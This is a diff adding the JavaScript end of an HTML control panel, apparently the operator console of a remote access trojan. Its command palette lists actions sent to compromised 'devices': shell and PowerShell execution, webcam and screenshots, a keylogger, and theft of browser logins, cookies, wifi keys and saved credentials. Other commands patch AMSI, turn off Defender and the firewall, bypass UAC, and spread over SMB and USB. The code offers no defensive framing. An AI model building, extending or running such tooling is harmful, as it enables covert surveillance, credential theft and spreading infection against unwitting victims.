+    $("#dcbtn").textContent="disconnect";
+    done(t,"DIRECT LINK "+net.ip+":"+net.port,true);
+    toast("all commands now bypass the database","ok");
+  }catch(e){
+    BASE=null; done(t,"cannot reach "+net.ip+":"+net.port+" — forward the port",false);
+  }
+}
+
+/* ---------- palette ---------- */
+const CMDLIST=[["exec","shell command"],["ps","powershell"],["shot","screenshot"],["cam","webcam"],
+ ["ls","list files"],["dl","download"],["info","system info"],["proc","processes"],["users","local users"],
+ ["inst","installed software"],["net","netstat"],["tasks","scheduled tasks"],["drv","drivers"],
+ ["lan","arp table"],["scan","scan subnet"],["smb","share list"],["spread","spread over smb"],
+ ["usb","spread to usb"],["hives","dump hives"],["pass","browser logins"],["cookies","cookies"],
+ ["wifi","wifi keys"],["cmdkey","saved creds"],["keylog","keylogger"],["live","live view"],
+ ["amsi","patch amsi"],["defoff","defender off"],["fwoff","firewall off"],["uac","uac bypass"],
+ ["rdp","enable rdp"],["httpd","open http port"],["persist","reinstall"],["heal","self heal"],
+ ["lock","lock"],["monoff","monitor off"],["power","reboot"],["uninst","uninstall"]];
+function palette(){ $("#pal").classList.add("on"); $("#pq").value=""; fillP(); $("#pq").focus() }
+function closeP(){ $("#pal").classList.remove("on") }
+function fillP(){
+  const f=$("#pq").value.toLowerCase();
+  $("#palist").innerHTML="";
+  CMDLIST.filter(([c,d])=>!f||c.includes(f)||d.includes(f)).slice(0,14).forEach(([c,d])=>{
+    const el=document.createElement("div"); el.innerHTML=`<b style="color:var(--ac)">${c}</b> — ${d}`;
+    el.onclick=()=>{ closeP(); runQuick(c) }; $("#palist").appendChild(el);
+  });
+}
+function runQuick(c){
+  const map={exec:()=>exec(),ls:()=>ls(),live:()=>{$$("#tabs button").find(b=>b.dataset.k==="liv").click()},
+    httpd:()=>directConnect()};
+  if(map[c]) return map[c]();
+  send(c);
+}
+
+$$(".chip").forEach(c=>c.onclick=()=>{$$(".chip").forEach(x=>x.classList.remove("on"));c.classList.add("on");FIL=c.dataset.f;render()});
+$("#search").oninput=e=>{Q=e.target.value.toLowerCase();render()};
+document.addEventListener("keydown",e=>{
+  if(e.ctrlKey&&e.key==="k"){e.preventDefault();palette()}
+  if(e.key==="Escape"){closeP();closeM()}
+  if(e.ctrlKey&&e.key==="Enter"&&tabOn()==="con")exec();
+});
+
+async function tick(){ DEV=await getF("devices")||{}; render(); if(cur)hdr(); if(tabOn()==="key")loadK() }
+(async()=>{ await tick(); setInterval(tick,5000);
+  const l=localStorage.getItem("last"); if(l&&DEV[l]) openD(l) })();
+</script></body></html>
